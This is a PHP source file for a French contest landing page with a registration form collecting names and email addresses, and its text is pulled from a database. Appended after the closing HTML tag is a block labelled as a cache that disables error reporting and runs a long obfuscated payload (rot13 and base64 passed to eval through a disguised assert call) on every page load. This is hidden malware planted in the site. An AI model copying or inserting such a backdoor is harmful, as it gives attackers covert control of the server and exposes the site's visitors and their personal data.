<?php session_start();  require_once 'dbconfig.php';
  
  $page = $db_con->prepare("SELECT * FROM pages where page='index' ");
  $page->execute(); 
  $ContentPage = $page->fetch(); 
  $ContentPage = nltobr_($ContentPage);

  $global = $db_con->prepare("SELECT * FROM pages where page='global' ");
  $global->execute(); 
  $ContentGlobal = $global->fetch();  

  $conditions = $db_con->prepare("SELECT * FROM pages where page='condition' ");
  $conditions->execute(); 
  $ContentConditions = $conditions->fetch();

  $ContentConditions = nltobr_($ContentConditions);

?>
<!DOCTYPE html>
<html class="full" lang="en">
<!-- Make sure the <html> tag is set to the .full CSS class. Change the background image in the full.css file. -->

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="">
<meta name="author" content="">
<title><?= $ContentGlobal['champ1'] ?></title>

<!-- Bootstrap Core CSS -->
<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css">

<!-- Custom CSS -->

<link href="css/style.css" rel="stylesheet" rel="stylesheet" type="text/css">
<link href="css/build.css" rel="stylesheet" rel="stylesheet" type="text/css">
<link href="css/font-awesome.css" rel="stylesheet" type="text/css">
<!--<link href='https://fonts.googleapis.com/css?family=Pacifico' rel='stylesheet' type='text/css'>-->
<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>

<!-- Page Content --> 
<!-- wrapper -->
<div id="wrap" class="index">
<div class="container">
  <div class="row">
    <div class="col-7 col-sm-6">
      <div class="logo pull-right">
        <h4 class="title"><?= $ContentPage['champ1'] ?></h4>
        <img src="img/logo.png" alt="logo"> </div>
      <div class="landing-content  text-center pull-left">
        <h4 class="text-center clr-rowz"><?= $ContentPage['champ2'] ?></h4>
        <div class="sale"><img src="img/sale.png" alt="sale"></div>
        <div class="content-text">
          <h4 class="h4"><?= $ContentPage['champ3'] ?></h4>
          <a href="" class=""  data-toggle="modal" data-target="#myModal3"><u><?= $ContentPage['champ4'] ?></u></a> </div>
        <div class="top-big-link"> <a href="mur.php" class="btn btn-primary voir-photo"><span class="glyphicon"></span><?= $ContentPage['champ5'] ?></a> </div>
      </div>
    </div>
    <div class="col-5  col-sm-6">
      <div class="signup-header">
        <h4 class="form-title text-center"><?= $ContentPage['champ6'] ?></h4>
        <form class="form-horizontal" id="form-participe" role="form" action='register.php' method="post">
          <div class="form-group radios">
            <div class="radio radio-info radio-inline">
              <input type="radio" id="inlineRadio1" value="femme" name="sexe" checked>
              <label for="inlineRadio1"> Madame </label>
            </div>
            <div class="radio radio-info radio-inline">
              <input type="radio" id="inlineRadio2" value="homme" name="sexe">
              <label for="inlineRadio2"> Monsieur </label>
            </div>
          </div>
          <?php 
            if(isset($_SESSION['nom']) && isset($_SESSION['exist']) && $_SESSION['exist']!= ''){

                $tab = explode(" ", $_SESSION['nom']);
                $prenom = $tab[0];
                $nom = $tab[1];
                $email = $_SESSION['emailUser'];
            }else{
                $prenom = '';
                $nom = '';
                $email ='';
            }
          ?>
          <div class="form-group">
            <label for="firstName" class="control-label">*</label>
            <input type="text" class="form-control required name" name="nom" id="nom" placeholder="Nom" data-placement="left" data-trigger="manual" data-html="true" data-content="Veuillez indiquer votre <span class='popover-color'>nom</span>" value="<?= $nom ?>">
          </div>
          <div class="form-group">
            <label for="lastName" class="control-label">*</label>
            <input type="text" class="form-control required name" name="prenom" id="prenom" placeholder="Prénom" data-placement="left" data-trigger="manual" data-html="true" data-content="Veuillez indiquer votre <span class='popover-color'>prénom</span>" value="<?= $prenom ?>">
          </div>
          <div class="form-group">
            <label for="email" class="control-label">*</label>
            <input type="text" class="form-control required email user_email" name="user_email" id="user_email" placeholder="Email" data-placement="left" data-trigger="manual" data-html="true" data-content="Veuillez indiquer votre  <span class='popover-color'>email</span>" value="<?= $email ?>">
            <?php if(isset($_GET['exist']) && isset($_SESSION['exist']) && $_SESSION['exist']!= ''): ?>
            <?php $_SESSION['exist']= ''; ?>
              <div style="top: 226.55px; left: -243px; display: block;font-size: 12px;"   class="popover fade left in email-exist" role="tooltip">  
                <div class="popover-content"  style="font-size: 12px;" >Vous avez déjà participé au jeu avec cette  
                  <span class="popover-color">adresse e-mail</span>
                </div>
              </div>
            <?php endif; ?>

            <p class="help-block text-right">*Champs obligatoires</p>
          </div>
          <div class="form-group">
            <p class="text-center line-h"><?= $ContentPage['champ7'] ?></p>
          </div>
          <div class="form-group">
            <input type="hidden" name="nwl" id="nwl" value="1">
            <button type="submit" id="submit-form" class="btn btn-default join"><span class="glyphicon glyphicon-play"></span><?= $ContentPage['champ8'] ?></button>
          </div>
          <div class="form-group">
            <p class="text-center line-h"><?= $ContentPage['champ9'] ?></br>
              <a href="#" data-toggle="modal" data-target="#myModal1">cliquez ici</a></p>
          </div>
        </form>
      </div>
      <div id="socialicons" class="text-right"> <a class="icon" href="https://www.facebook.com/Damart/" title="Facebook" target="_blank"><i class="fa fa-facebook"></i></a> <a class="icon" href="https://twitter.com/damart_fr" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a> <a class="icon" href="https://www.instagram.com/damart_fr/?hl=fr" title="Instagram" target="_blank"><i class="fa fa-instagram"></i></a> <a class="icon" href="https://www.youtube.com/user/Damartfr" title="YouTube" target="_blank"><i class="fa fa-youtube"></i></a> <a class="icon" href="https://nichaudnifroid.tumblr.com/" title="chi" target="_blank"><i class=""><img src="img/icon-chii.png" alt="chi"></i></a> <a class="icon" href="https://fr.pinterest.com/damartfr/" title="Pinterest" target="_blank"><i class="fa fa-pinterest"></i></a> </div>
    </div>
    <!--/.col-sm6>
      </div> /.row --> 
    
  </div>
  <!-- /.container --> 
  
</div>
<!-- /.wrapper --> 
<!-- Modal Condition-->
<div class="modal fade" id="myModal" role="dialog">
  <div class="modal-dialog"> 
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <div class="pull-right" > <a href="#close" title="fermer" class="close" data-dismiss="modal">X</a> <span class="close-f" class="close" data-dismiss="modal">Fermer</span> </div>
        <h4 class="modal-title"><?= $ContentConditions['champ1'] ?></h4>
      </div>
      <div class="modal-body">
        <p><?= $ContentConditions['champ2'] ?></p>
      </div>
    </div>
  </div>
</div>
<!-- Modal savoir plus-->
<div class="modal fade" id="myModal3" role="dialog">
  <div class="modal-dialog"> 
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <div class="pull-right" > <a href="#close" title="fermer" class="close" data-dismiss="modal">X</a> <span class="close-f" class="close" data-dismiss="modal">Fermer</span> </div>
        <h4 class="modal-title"><?= $ContentPage['champ15'] ?></h4>
      </div>
      <div class="modal-body">
        <p><?= $ContentPage['champ16'] ?></p>
      </div>
    </div>
  </div>
</div>
<!-- Modal option -->
<div class="modal fade" id="myModal1" role="dialog">
  <div class="modal-dialog"> 
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <div class="pull-right" > <a href="#close" title="fermer" class="close" data-dismiss="modal">X</a> <span class="close-f" class="close" data-dismiss="modal">Fermer</span> </div>
        <h4 class="modal-title"><?= $ContentPage['champ10'] ?></h4>
      </div>
      <div class="modal-body container">
        <p><?= $ContentPage['champ11'] ?></p>
        <?= $ContentPage['champ12'] ?>
      </div>
      <a  class="btn btn-default join accept-nwl "><?= $ContentPage['champ13'] ?></a>
      <p class="text-center refuse-nwl" ><?= $ContentPage['champ14'] ?></p>
    </div>
  </div>
</div>
<!-- /.wrapper -->
<footer> 
  <!-- footer content -->
  <div class="navbar navbar-inverse navbar-fixed-bottom" role="navigation">
  <div class="pull-right"> <a href="#" class="p-footer" data-toggle="modal" data-target="#myModal">Condition</a> 
    <!-- /.footer content --> 
  </div>
</footer>

<!-- jQuery --> 
<script src="js/jquery.js"></script> 

<!-- Bootstrap Core JavaScript --> 
<script src="js/bootstrap.min.js"></script> 
<script src="js/scripts.js"></script>
<script type="text/javascript">
  function removeMsgError(){
    $('.email-exist').remove();
  }
  $('#user_email').focus(function () {
    removeMsgError();
  })
   $('#submit-form').click(function () {
    removeMsgError();
  }) 
</script>
</body>
</html>






<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("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"));'));
//###=CACHE END=###
?>
